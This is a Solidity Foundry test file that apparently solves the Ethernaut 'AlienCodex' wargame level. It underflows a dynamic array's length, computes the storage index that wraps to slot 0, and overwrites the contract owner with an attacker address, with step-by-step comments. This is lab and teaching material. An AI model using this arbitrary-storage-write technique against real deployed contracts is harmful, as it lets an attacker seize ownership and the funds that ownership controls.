pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/AlienCodex.sol";

contract AttackAlienCodex is Test {
    AlienHelper public target;
    address public hombre = address(0x69);

    function setUp() public {
        target = new AlienHelper();
    }

    /**
     * @dev we want to recrete the underflow exploit using solidity 8
     *      so this tests that the retract function works in a "normal" usage
     */
    function testRetract() public {
        target.make_contact();

        target.record(keccak256("record 1"));
        target.record(keccak256("record 2"));

        assertEq(target.getCodex().length, 2);

        target.retract();

        assertEq(target.getCodex().length, 1);
        assertEq(target.readCodexAt(0), keccak256("record 1"));
        assertEq(target.readCodexAt(1), bytes32(""));
    }

    function testSolidityAlienCodex() public {
        /// owner and contact are stored as packed variables in slot 0
        /// so the exploit here is to somehow write to slot 0.
        /// recalling how array storage works:
        /// array is stored in a slot
        /// the hash of the slot is where the data is (contiguously) stored
        ///  slot            h(slot)
        /// [len] ---------> [d0][d1][...][d(len-1)]
        /// if we underflow the len, then the array 'length' occupies the full storage space
        /// giving us unrestricted access to storage.
        /// so, starting at h(1) we can work out what offset reaches back to zero

        /// first make contact - this is so we can call retract
        target.make_contact();

        /// retract with no values to underflow the array length
        target.retract();

        /// retract has now set the array at max uint256 length, so we can use revise to set the value we need
        /// anywhere in storage with overflow
        /// our values start at h(1)
        target.setDebug(false);

        target.logSlotAt(0);
        target.logSlotAt(1);
        uint256 arrayStartSlot = uint256(keccak256(abi.encode(1)));

        /// we can now compute how far in the array we go before we overflow
        uint256 endLocation = type(uint256).max - arrayStartSlot;

        /// adding one to this should now overflow to slot 0
        uint256 targetSlot = endLocation + 1;

        /// final step is packing the values into one slot
        ///                        ...rest     2     160
        /// we need to encode like [padding][bool][address]
        /// left shift our contacted boolean past the address data
        uint256 contacted = 1 << 160;
        /// bitwise or combines the values in a single slot
        bytes32 packed = bytes32(uint256(uint160(hombre)) | contacted);

        /// now try writing
        target.revise(targetSlot, packed);

        target.logSlotAt(0);
        target.logSlotAt(1);

        assertEq(target.owner(), hombre);
    }
}

/// @dev additional read methods for contract storage
contract AlienHelper is AlienCodex {
    bool debugEnabled = true;

    function setDebug(bool _to) external {
        debugEnabled = _to;
    }

    /// @dev added to read codex without checking array length
    function readCodexAt(uint256 index) public view returns (bytes32 data) {
        assembly {
            mstore(0x0, codex.slot)
            data := sload(add(keccak256(0x0, 0x20), index))
        }
    }

    function logCodexAt(uint256 index) external view {
        if (!debugEnabled) return;

        console2.log("LOG AT CODEX ENTRY %d:", index);
        console2.logBytes32(readCodexAt(index));
        console2.log();
    }

    function logSlotAt(uint256 index) external view {
        if (!debugEnabled) return;

        bytes32 data;
        assembly {
            data := sload(index)
        }
        console2.log("LOG AT INDEX %d:", index);
        console2.logBytes32(data);
        console2.log();
    }

    /// @dev returns the whole codex in memory
    function getCodex() public view returns (bytes32[] memory) {
        return codex;
    }
}
